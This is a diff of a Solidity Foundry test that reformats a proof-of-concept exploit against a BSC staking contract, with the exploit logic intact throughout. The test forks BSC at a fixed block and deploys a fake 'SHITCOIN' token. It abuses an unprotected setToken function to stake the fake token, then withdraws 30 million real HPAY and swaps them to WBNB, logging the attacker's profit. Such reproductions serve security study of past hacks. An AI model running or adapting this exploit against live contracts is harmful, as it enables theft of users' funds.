@@ -9,31 +9,30 @@ import "./interface.sol";
 // @Address
 // https://bscscan.com/address/0xab74fbd735cd2ed826b64e0f850a890930a91094
 
-interface MintableAutoCompundRelockBonus{
+interface MintableAutoCompundRelockBonus {
     function setToken(address) external;
     function stake(uint256) external;
     function withdraw(uint256) external;
 }
 
-contract ContractTest is DSTest{
-    
+contract ContractTest is DSTest {
     IERC20 HPAY = IERC20(0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A);
-    IERC20 WBNB =IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     MintableAutoCompundRelockBonus Bonus = MintableAutoCompundRelockBonus(0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0);
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 22280853); 
+        cheats.createSelectFork("bsc", 22_280_853);
     }
 
-    function testExploit() external{
-        HPAY.approve(address(Router), type(uint).max);
+    function testExploit() external {
+        HPAY.approve(address(Router), type(uint256).max);
         // fake token deposit
         SHITCOIN shitcoin = new SHITCOIN();
         shitcoin.mint(100_000_000 * 1e18);
-        shitcoin.approve(address(Bonus), type(uint).max);
+        shitcoin.approve(address(Bonus), type(uint256).max);
         Bonus.setToken(address(shitcoin));
         Bonus.stake(shitcoin.balanceOf(address(this)));
         Bonus.setToken(address(HPAY));
@@ -43,56 +42,44 @@ contract ContractTest is DSTest{
         Bonus.withdraw(30_000_000 * 1e18);
         HPAYToWBNB();
 
-        emit log_named_decimal_uint(
-            "[End] Attacker WBNB balance after exploit",
-            WBNB.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
     }
 
     function HPAYToWBNB() internal {
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(HPAY);
         path[1] = address(WBNB);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            HPAY.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            HPAY.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 }
 
 contract SHITCOIN {
-    uint public totalSupply;
-    mapping(address => uint) public balanceOf;
-    mapping(address => mapping(address => uint)) public allowance;
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
     string public name = "SHIT COIN";
     string public symbol = "SHIT";
     uint8 public decimals = 18;
 
-    event Transfer(address indexed from, address indexed to, uint value);
-    event Approval(address indexed owner, address indexed spender, uint value);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
 
-    function transfer(address recipient, uint amount) external returns (bool) {
+    function transfer(address recipient, uint256 amount) external returns (bool) {
         balanceOf[msg.sender] -= amount;
         balanceOf[recipient] += amount;
         emit Transfer(msg.sender, recipient, amount);
         return true;
     }
 
-    function approve(address spender, uint amount) external returns (bool) {
+    function approve(address spender, uint256 amount) external returns (bool) {
         allowance[msg.sender][spender] = amount;
         emit Approval(msg.sender, spender, amount);
         return true;
     }
 
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint amount
-    ) external returns (bool) {
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
         allowance[sender][msg.sender] -= amount;
         balanceOf[sender] -= amount;
         balanceOf[recipient] += amount;
@@ -100,13 +87,13 @@ contract SHITCOIN {
         return true;
     }
 
-    function mint(uint amount) external {
+    function mint(uint256 amount) external {
         balanceOf[msg.sender] += amount;
         totalSupply += amount;
         emit Transfer(address(0), msg.sender, amount);
     }
 
-    function burn(uint amount) external {
+    function burn(uint256 amount) external {
         balanceOf[msg.sender] -= amount;
         totalSupply -= amount;
         emit Transfer(msg.sender, address(0), amount);
